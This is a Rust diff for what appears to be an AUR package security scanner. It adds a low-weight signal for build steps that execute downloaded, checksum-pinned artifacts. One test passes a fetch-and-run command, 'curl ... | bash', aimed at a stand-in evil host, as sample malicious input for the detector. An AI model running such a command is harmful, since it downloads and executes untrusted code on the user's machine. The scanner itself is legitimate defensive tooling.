@@ -10,6 +10,7 @@ use std::collections::HashSet;
 pub struct ScanContext {
     package: PackageContext,
     executable_helper_content: Option<String>,
+    executed_artifacts: Vec<String>,
 }
 
 /// Scan a package by name, printing results. Returns the computed tier.
@@ -44,6 +45,7 @@ pub fn build_context(package_name: &str) -> Result<ScanContext, String> {
     let pkgbuild_content = Some(tree.pkgbuild_content);
     let install_script_content = tree.install_script_content;
     let executable_helper_content = tree.local_source_content;
+    let executed_artifacts = tree.executed_artifacts;
     let mut git_log = aur_git::read_git_log(&repo_path, 20);
 
     // Attach diff to the latest commit
@@ -97,6 +99,7 @@ pub fn build_context(package_name: &str) -> Result<ScanContext, String> {
             aur_comments,
         },
         executable_helper_content,
+        executed_artifacts,
     })
 }
 
@@ -119,6 +122,7 @@ pub fn build_context_prefetched(
     let pkgbuild = Some(tree.pkgbuild_content);
     let install = tree.install_script_content;
     let executable_helper_content = tree.local_source_content;
+    let executed_artifacts = tree.executed_artifacts;
     let mut log = aur_git::read_git_log(&repo_path, 20);
 
     if let Some(first) = log.first_mut() {
@@ -159,6 +163,7 @@ pub fn build_context_prefetched(
             aur_comments: comments,
         },
         executable_helper_content,
+        executed_artifacts,
     })
 }
 
@@ -177,10 +182,11 @@ pub fn scan_local_build_with_config(
     pkgbuild_content: &str,
     install_script_content: Option<&str>,
     executable_helper_content: Option<&str>,
+    executed_artifacts: &[String],
     config: &crate::shared::config::Config,
 ) -> ScanResult {
     let ctx = local_build_context(name, pkgbuild_content, install_script_content);
-    run_analysis_inputs_with_config(&ctx, executable_helper_content, config)
+    run_analysis_inputs_with_config(&ctx, executable_helper_content, executed_artifacts, config)
 }
 
 /// Scan only the transaction-time shell code embedded in an ALPM `.INSTALL`
@@ -263,6 +269,7 @@ pub fn run_scan_context_with_config(
     run_analysis_inputs_with_config(
         &ctx.package,
         ctx.executable_helper_content.as_deref(),
+        &ctx.executed_artifacts,
         config,
     )
 }
@@ -272,12 +279,13 @@ pub fn run_analysis_with_config(
     ctx: &PackageContext,
     config: &crate::shared::config::Config,
 ) -> ScanResult {
-    run_analysis_inputs_with_config(ctx, None, config)
+    run_analysis_inputs_with_config(ctx, None, &[], config)
 }
 
 fn run_analysis_inputs_with_config(
     ctx: &PackageContext,
     executable_helper_content: Option<&str>,
+    executed_artifacts: &[String],
     config: &crate::shared::config::Config,
 ) -> ScanResult {
     let all_features = features::all_features();
@@ -286,6 +294,25 @@ fn run_analysis_inputs_with_config(
     for feature in &all_features {
         let signals = feature.analyze(ctx);
         all_signals.extend(signals);
+    }
+
+    // Resolved by the inert tree loader: a build step runs a downloaded,
+    // checksum-pinned source artifact (typically `--appimage-extract`). The
+    // artifact is opaque upstream code that is installed and run anyway, so
+    // this is reported at low weight rather than failing the scan.
+    if !executed_artifacts.is_empty() {
+        all_signals.push(scoring::Signal {
+            id: "P-EXEC-DOWNLOADED-ARTIFACT".to_string(),
+            category: scoring::SignalCategory::Pkgbuild,
+            points: 10,
+            description: format!(
+                "Build step executes downloaded, checksum-pinned source artifact: {}",
+                executed_artifacts.join(", ")
+            ),
+            is_override_gate: false,
+            matched_line: None,
+            min_tier: None,
+        });
     }
 
     if let Some(content) = executable_helper_content {
@@ -335,6 +362,7 @@ mod tests {
         let result = run_analysis_inputs_with_config(
             &context,
             Some("curl https://evil.invalid/payload | bash\n"),
+            &[],
             &config,
         );
 
